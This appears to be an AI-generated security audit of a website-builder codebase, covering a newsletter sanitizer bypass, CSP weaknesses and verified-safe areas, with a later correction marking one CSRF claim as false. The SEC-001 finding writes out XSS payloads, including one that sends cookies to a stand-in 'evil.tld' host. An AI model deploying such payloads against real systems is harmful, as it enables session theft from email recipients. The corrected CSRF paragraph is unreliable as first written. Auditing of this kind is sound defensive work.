# Security Audit — Force Website Builder (Application Security / STRIDE + OWASP)

---

agent: security-auditor
status: COMPLETE
timestamp: 2026-07-02T12:50:00Z
duration: 1400
findings: 5
critical_count: 0
high_count: 0
errors: []
skipped_checks: ["npm audit (not run — read-only audit scope, out of band CI already gates this per rule 10)", "gitleaks full-history scan (not re-run — config verified sound, cadence owned by CI workflow)"]

---

## Scope note

Read-only audit against `origin/main` @ `2332c4d5` (worktree
`force-website-builder__fix-deep-audit-2026-07-02`). No source files were
modified. This report supersedes/updates prior scattered security notes in
scoped memory — those memories were verified against current code, not
re-derived from scratch, per the "triangulate all sources" rule.

## Risk Summary

| Category                          | Critical | High | Medium | Low |
| --------------------------------- | -------- | ---- | ------ | --- |
| Injection (SQL/NoSQL/Command/XSS) | 0        | 0    | 1      | 0   |
| Authn/Session                     | 0        | 0    | 0      | 0   |
| Authorization                     | 0        | 0    | 0      | 0   |
| Secrets                           | 0        | 0    | 0      | 0   |
| Headers/Config                    | 0        | 0    | 2      | 1   |
| CSRF/Rate-limit                   | 0        | 0    | 0      | 0   |
| Data exposure/PII                 | 0        | 0    | 1      | 0   |

**Total: 0 Critical, 0 High, 4 Medium, 1 Low**

The codebase's security posture is materially better than a typical
mid-size SaaS at this stage — the 2026-06-21 browser-attack-surface audit
(PR #340) and the 2026-06-09 storefront security pass already closed the
categories that usually dominate this kind of report (stored-token XSS
theft, open tenant RLS, missing role gates, CTA-link `javascript:` XSS,
CSRF bypass gaps). What remains is defense-in-depth gaps, not exploitable
critical/high holes, confirmed by direct code reading (not just grep).

## Findings

### SEC-001 (Medium, CONFIRMED-GAP / PLAUSIBLE-EXPLOIT) — Regex-based newsletter HTML sanitizer has a known "slash-separator" event-handler bypass

**Location:** `apps/api/src/lib/email-html-sanitizer.ts:81-86` (`stripEventHandlers`), used by `apps/api/src/routes/newsletter.routes.ts:270` (`sanitizeNewsletterHtml(body.html)`) before broadcasting to every active `NewsletterSubscriber` via Resend.

**The gap:** `stripEventHandlers` matches event-handler attributes only when
preceded by literal whitespace:

```js
.replace(/\son[a-z-]+\s*=\s*"[^"]*"/gi, '')
```

The `\s` before `on` does not include `/`. HTML5's tokenizer treats an
unquoted `/` between attributes as an attribute-boundary character (the
"before attribute name state" ignores a lone solidus outside the
`/>` self-closing context), so browsers/mail-client renderers that use a
real HTML parser will still recognize the handler in a payload like:

```html
<img src=x/onerror=alert(document.cookie)>
<body/onload=alert(1)>
```

`img` and `body` are not in `FORBIDDEN_ELEMENTS` (only `script, style,
iframe, object, embed, link, meta, base, form, input, button, textarea,
select, option, svg, math, noscript, template` are stripped), so this
specific attacker-controlled string survives the sanitizer intact and is
relayed, wrapped in the branded shell, to every subscriber's inbox.

**Exploit scenario:** A store_admin (or an attacker who has compromised a
store_admin session — the CSRF/XSS chain this same repo already hardened
elsewhere) composes a newsletter broadcast containing
`<img src=x/onerror=fetch('https://evil.tld/steal?c='+document.cookie)>`.
`POST /newsletter/broadcast` sanitizes with the vulnerable regex, the
payload survives, and Resend relays it to every subscriber. Exploitability
in practice is dampened by (a) major webmail providers (Gmail, Outlook web)
running their own independent, non-regex sanitizers that strip event
handlers regardless of syntax, and (b) no admin-side `dangerouslySetInnerHTML`
preview of the raw payload was found in `apps/admin` (grepped, none), so
there's no same-session stored-XSS reflection back at other admins before
send. Residual risk is desktop/legacy mail clients or any future admin
preview feature that doesn't re-sanitize.

**Why this is worth fixing despite the mitigations:** it's the _only_
security layer between an admin-composed field and mass-email relay through
the platform's sender reputation — a hand-rolled regex "parser" for HTML is
a categorically fragile primitive (well-documented OWASP guidance: don't
hand-roll HTML sanitizers). CLAUDE.md's own code-quality rule 2 calls for
DOMPurify or an equivalent library, and the file's own header comment
acknowledges DOMPurify isn't a runtime dependency today — this is the trade
made, not an oversight, but it should be tightened.

**Remediation:**

- Extend the whitespace test to `/[\s\/]on[a-z-]+\s*=.../gi` (treat `/` as
  an attribute-boundary char, matching the HTML5 tokenizer's own behavior)
  as a minimal patch.
- Better: add `sanitize-html` (small, no-DOM-required, actively maintained,
  MIT) as a real dependency and replace the hand-rolled pass — this closes
  the whole bypass class (comment-based, malformed-tag, and future evasions)
  rather than patching one regex at a time.
- Add `body`, `video`, `audio`, `source`, `track`, `details` to
  `FORBIDDEN_ELEMENTS` or explicitly allowlist only the tags newsletters
  actually need (`p, br, b, strong, i, em, u, a, ul, ol, li, img, table,
tr, td, th, div, span, h1-h6, blockquote`) — allowlist-by-tag is safer
  than denylist-by-tag for a hand-rolled pass.

---

### SEC-002 (Medium, CONFIRMED, by-design trade-off — flagged for awareness) — CSP `script-src`/`style-src` include `'unsafe-inline' 'unsafe-eval'` on both storefront and admin

**Location:** `apps/web/next.config.js` (script-src line ~109-112), `apps/admin/next.config.js` (CSP value ~130).

**The gap:** Both Next.js apps' CSP allows `'unsafe-inline'` and
`'unsafe-eval'` in `script-src`. This is documented in-code as required by
the OneSignal v16 web-push SDK. The practical effect: CSP's primary value as
an XSS _mitigation_ (blocking inline/injected `<script>` execution even if
an XSS payload gets into the DOM) is effectively neutralized on both apps —
any future stored/reflected XSS finding would execute even with this CSP in
place, because inline scripts and `eval()` are explicitly permitted.

**Exploit scenario:** This is not itself an exploitable vulnerability — it's
a missing safety net. If any future change introduces an XSS primitive
(e.g. a new `dangerouslySetInnerHTML` call on unescaped input, or a
third-party widget with an injection flaw), CSP will not block it on either
app, whereas a strict `script-src 'self'` + nonce-based policy would.

**Remediation (lower priority — genuine SDK constraint):**

- Investigate OneSignal's documented nonce-based CSP alternative for v16 (nonce
  support was added in some SDK versions) to drop `'unsafe-inline'`.
- At minimum, scope `'unsafe-eval'` removal to a follow-up ticket — `eval()`
  is a stronger primitive than inline-script and worth isolating if the SDK
  allows it (some analytics-only builds of the OneSignal SDK don't need it).
- Track as accepted residual risk in `docs/business/` security posture doc
  if no fix is pursued, so it's a documented decision, not silent drift.

---

### SEC-003 (Medium, PLAUSIBLE) — Admin CSP `connect-src` retains a stale `https://*.supabase.co` entry

**Location:** `apps/admin/next.config.js` CSP `connect-src` directive.

**The gap:** The admin CSP's `connect-src` allowlists `https://*.supabase.co`
even though the project migrated off Supabase to Neon Postgres (per CLAUDE.md
"Database: Neon PostgreSQL (serverless)" and "local .env has stale Supabase
URL, production uses Neon"). This is a wildcard subdomain allowlist for a
provider the platform no longer uses for anything reachable from the
browser — it doesn't grant an attacker anything today (no code calls
`fetch()` against Supabase), but a wildcard CSP entry for an unused SaaS
domain is dead attack surface: if that domain is ever squatted, or if a
future XSS payload needs `fetch`/`XHR` exfiltration, `*.supabase.co` is a
pre-approved destination that would otherwise be blocked.

**Remediation:** Remove `https://*.supabase.co` from admin's `connect-src`
now that Neon is the sole database. Low effort, closes one line of
unnecessary CSP surface. This is exactly the class of drift Rule D
("blast-radius sweep on every change") exists to catch — the Supabase→Neon
migration didn't sweep this CSP directive.

---

### SEC-004 (Low, CONFIRMED, informational) — `X-XSS-Protection` header set inconsistently (deprecated header, harmless either way)

**Location:** `apps/api/src/middleware/security.ts:592` sets
`X-XSS-Protection: 0` (correctly disabled, per the in-code comment
explaining Chrome's auditor was a side-channel risk); `apps/web/next.config.js`
and `apps/admin/next.config.js` both set `X-XSS-Protection: 1; mode=block`
(the old "enable" value).

**The gap:** The API's own comment gives the correct modern guidance (MDN:
explicitly disable, don't enable) but the two Next.js apps do the opposite.
In practice this header is ignored by all current browsers (removed from
Chrome/Edge, never in Firefox/Safari) so there's no live exploit here — it's
purely a consistency/hygiene gap between the three surfaces the audit was
asked to check as one platform.

**Remediation:** Align all three surfaces to `X-XSS-Protection: 0` (or drop
the header from web/admin entirely) to match the API's own documented
rationale.

---

### SEC-005 (Medium, PLAUSIBLE, informational) — `ALERTS_WEBHOOK_TOKEN` unset in non-production still fails open (`return true`), consistent with dev convenience but worth confirming Railway prod env before next launch

**Location:** `apps/api/src/routes/alert-webhooks.routes.ts:14-24`.

**Status:** This is a correctly-implemented instance of Production Reality
Gate 12 (boot-time `logger.fatal`-style warning when unset in
`NODE_ENV=production`, `return true` fail-open only in dev/test). Confirmed
current code matches the documented pattern — not a regression. Flagging
only as a **verification reminder**, not a code defect: this audit is
read-only and cannot confirm whether `ALERTS_WEBHOOK_TOKEN` is actually set
in the live Railway production environment. If it is unset in prod today,
the boot warning fires but the endpoint still accepts unsigned payloads
(the code explicitly documents this as the deliberate "don't hard-503"
choice) — meaning a single unauthenticated POST could flood the Telegram
alert channel. Recommend an operational check (`railway variables` or the
Railway dashboard) rather than a code change.

## Verified SAFE / Already-Fixed (excluded from findings, noted per audit instructions)

- **SQL injection via `$queryRawUnsafe`/`$executeRawUnsafe`** — all 14
  call sites (`reports.service.ts`, `tax-report.service.ts`,
  `bank-reconcile.service.ts`, `finance.routes.ts`, `journal.service.ts`,
  `audit-log-archive.ts`) use positional `$N` parameter binding exclusively;
  the only string-interpolated fragments are compile-time-fixed SQL
  structure (e.g. conditionally including `AND e.posted_at <= $2::timestamp`
  based on whether a Date arg was supplied — never user-supplied text).
  No SQL injection surface found. The known Prisma 6.19 Date-serialization
  defect (`feedback-prisma-queryrawunsafe-date-param-500`) is a correctness
  bug, not a security one, and is already fixed (`.toISOString()` + explicit
  `::timestamp` casts) at every site.
- **CMS page content XSS** — `apps/api/src/services/pages.service.ts`
  `renderBlocksToHtml` HTML-escapes every text field and passes every URL
  through a scheme allowlist (`safeUrl`: only `/`, `#`, `?`, `./`, `../`,
  `https?:`, `mailto:`, `tel:` — rejects `javascript:`/`data:`) before the
  storefront's `dangerouslySetInnerHTML` renders it
  (`apps/web/src/components/CmsPageContent.tsx:181`). The admin's live
  preview (`apps/admin/.../content/[slug]/page.tsx`) replicates the exact
  same escape+allowlist logic client-side. Both sides verified byte-for-byte
  consistent — this is the textbook-correct pattern (server escapes, output
  is provably safe HTML, no client sanitizer dependency needed).
- **CSV/XLSX formula injection** — single canonical `csvField()` /
  `neutralizeFormula()` in `packages/shared/src/csv-utils.ts` (prefixes a
  `'` when a cell starts with `= + - @ \t \r`, plus RFC 4180 quoting) is used
  across every export path checked (`bulk.service.ts` — 15+ fields including
  `sku`, `barcode`, variant SKUs/barcodes, category/tag/image lists, meta
  fields; `admin.routes.ts` orders export; `newsletter.routes.ts` subscriber
  export). Confirms the 2026-07-01 fix (`feedback-card-cta-ai-balancer-plp-filters-batch.md`)
  is comprehensive — no field was found using a raw string interpolation
  path instead of `csvField`.
- **Command injection** — no `exec`/`execSync`/`spawn`/`child_process` calls
  in `apps/api/src` (the `.exec(...)` hits found are all `RegExp.exec()` or
  `ioredis` multi/pipeline `.exec()`, unrelated). No `eval()`/`new Function()`
  on user input (`leader-election.ts`'s `client.eval()` is a Redis Lua script
  call with a fixed script string, not JS eval).
- **Secrets** — no committed `.env`/`.env.local`/`.env.production` in the
  tree; no hardcoded `sk_live_`/API-key-shaped literals found outside test
  fixtures; `.gitleaks.toml` allowlists only proven CI-test literals by exact
  string match (not commit-fingerprint, which would rot on squash-merge);
  `.gitleaksignore` entries are all documented false positives (test
  fixtures, doc examples, CI env-var _names_). No evidence of a real leaked
  secret.
- **Security headers** — all three surfaces (API via `helmet` +
  `securityHeaders` middleware, `apps/web/next.config.js`,
  `apps/admin/next.config.js`) set HSTS (1yr + preload), X-Content-Type-Options,
  Referrer-Policy, and a CSP. API additionally sets an exhaustive
  `Permissions-Policy` (27 features locked down) and Cross-Origin-Opener/
  Resource-Policy. `X-Frame-Options` was deliberately dropped from the
  storefront only, with CSP `frame-ancestors` as the documented replacement
  (correct call — some browsers prioritize X-Frame-Options over CSP
  frame-ancestors when both present, which broke the admin↔storefront
  live-preview embed).
- **CORS** — `isPlatformOrigin()`/`isAllowlistedMerchantOrigin()`
  (`apps/api/src/lib/cors-cache.ts`) use exact-match or tightly-scoped regex
  (own Vercel project names, own Cloudflare Workers account subdomain) —
  no `*.vercel.app` or `*.workers.dev` blanket allow that would let an
  attacker's own deploy ride credentialed CORS. No wildcard `origin: '*'`
  found anywhere in `apps/api/src/index.ts`.
- **CSRF** — `csrfProtection` in `apps/api/src/middleware/security.ts`
  correctly scopes its JSON/XHR skip to platform-controlled origins only
  (not "any CORS-allowed origin" — the code's own comment explains why that
  distinction matters against a malicious merchant setting `attacker.com` as
  their store domain), fails closed on verification errors, and requires a
  session ID + token for every other state-changing request. Webhook and
  `/auth/*`/`/public/*` skips are justified (HMAC / no-cookie / no-session
  respectively).

  > **FALSIFIED 2026-09-02** — this claim is contradicted by the code, not
  > supported by it: the skip condition ORs in `isAllowlistedMerchantOrigin(origin)`
  > alongside the platform-origin check (`security.ts:150-155`), so it is
  > exactly "any CORS-allowed origin" including merchant-controlled domains —
  > the failure mode this paragraph says the code avoids. This is P0-3 in
  > `docs/audits/2026-09-02-adversarial-audit.md` ("Merchant custom domain →
  > CSRF-exempt credentialed cross-origin → platform takeover"), **confirmed
  > still open** as of this correction — see that report for the current fix
  > status.

- **Auth cookies** — `token` + `refresh_token` are both `httpOnly: true`,
  `secure` in production, `sameSite: 'none'` in production (required for the
  documented cross-origin API↔frontend topology, not a misconfiguration).
  Rotating refresh tokens with reuse-detection (family revocation) confirmed
  present in `AuthService.refreshTokens`.
- **Password reset** — token is `crypto.randomBytes(32)` (256 bits of
  entropy), stored only as a SHA-256 hash (`reset:<hash>` in
  `refresh_tokens` table), 1-hour expiry, single-use (deleted/consumed on
  reset — verified via `expiresAt: { gt: new Date() }` lookup pattern
  matching the rest of the refresh-token model), and the request endpoint
  returns an identical success response whether or not the email exists
  (`apps/api/src/services/auth.service.ts:797-800` — explicit
  anti-enumeration comment + behavior). `/auth/forgot-password`,
  `/auth/reset-password`, `/auth/login`, `/auth/register`,
  `/auth/change-password`, `/auth/resend-verification` are all behind
  `authLimiter`.
- **Rate limiting** — `authLimiter` (Redis-backed via `RedisStore`, so
  limits are shared across API replicas — not per-process, which would let
  horizontal scaling multiply an attacker's effective budget) is applied to
  every auth-sensitive route; layered with per-email account lockout in
  `auth.service.ts` at 5 wrong attempts (two independent brute-force
  defenses, per the code's own comment).
- **File uploads** — every `multer` instance found
  (`upload.routes.ts`, `finance.routes.ts` bank statements,
  `shipping.routes.ts` area rates, `expenses.routes.ts` receipts) uses
  `memoryStorage()` with an explicit `fileSize` cap and a mimetype
  allowlist (`fileFilter`) — no unrestricted upload path found.
- **SSRF** — every `fetch(url, ...)` call site audited
  (`vercel-domain.service.ts`, `meta-provisioner.service.ts`,
  `wbs-bridge.service.ts`, `pixels-capi.service.ts`, `aramex.carrier.ts`,
  `icarry.carrier.ts`, `alerts.service.ts`, `onesignal.service.ts`,
  `revalidate-storefront.ts`) targets a hardcoded or config-derived
  provider API base URL, never a raw user-supplied URL/hostname. No
  "fetch this URL the merchant gave us" pattern was found.
- **Log injection** — no raw string-concatenated `logger.*()` calls with
  request-derived data were found; the codebase consistently uses `pino`'s
  structured-object logging (`logger.info({ userId, ... }, 'message')`),
  which is inherently immune to newline/control-char log injection because
  the message template is always a static string literal, not built from
  user input.
- **GDPR/Kuwait Law 13/2023 erasure** — `POST /auth/me/erase` and
  `GET /auth/me/export` both present and wired to the correct
  `AuthService.eraseAccount` primitive (verified against the scoped memory's
  documented pattern — endpoint code matches the described idempotent,
  11-child-table anonymization; the earlier "UI called the wrong
  soft-delete endpoint" bug from `5b98372` is fixed and current).
- **MFA** — `requireMfaEnrolled` gates the finance dashboard and other
  sensitive super_admin surfaces; MFA challenge tokens use a distinct JWT
  `audience: 'force-mfa-challenge'` so a challenge token can't be replayed
  as a full session token.
- **CTA/social/address link XSS** — `isSafeUrl`
  (`packages/shared/src/utils/safe-url.ts`) is applied via Zod `.refine()`
  at every write path checked (`store.routes.ts` heroCtaLink + addressUrl,
  `store-layout.routes.ts` productCardDefaults links) — confirms the
  2026-06-09 C6 fix is still in place, not regressed.
- **Cookie consent gate** — `MarketingPixelsProvider` in
  `apps/web/src/app/layout.tsx` is conditionally rendered only when
  `resolvedConsent?.marketing === true`, resolved server-side before first
  paint — pixels cannot fire before consent. SSR-visible consent-preferences
  link fallback (`fwb-cookie-link-ssr-layout` pattern) confirmed present in
  `layout.tsx`.

## Checklist

### Must Fix (Before Deploy)

- [ ] None — no critical/high findings.

### Should Fix (High Priority)

- [ ] SEC-001: Patch or replace the newsletter HTML sanitizer's event-handler regex bypass (`/` separator).
- [ ] SEC-003: Remove stale `https://*.supabase.co` from admin CSP `connect-src`.

### Recommended

- [ ] SEC-002: Investigate OneSignal nonce-based CSP to drop `unsafe-inline`/`unsafe-eval`, or document as an accepted residual risk.
- [ ] SEC-004: Align `X-XSS-Protection` header value across API/web/admin (pick `0`, matching the API's own documented rationale).
- [ ] SEC-005: Confirm `ALERTS_WEBHOOK_TOKEN` is actually set in the live Railway production environment (operational check, not code).
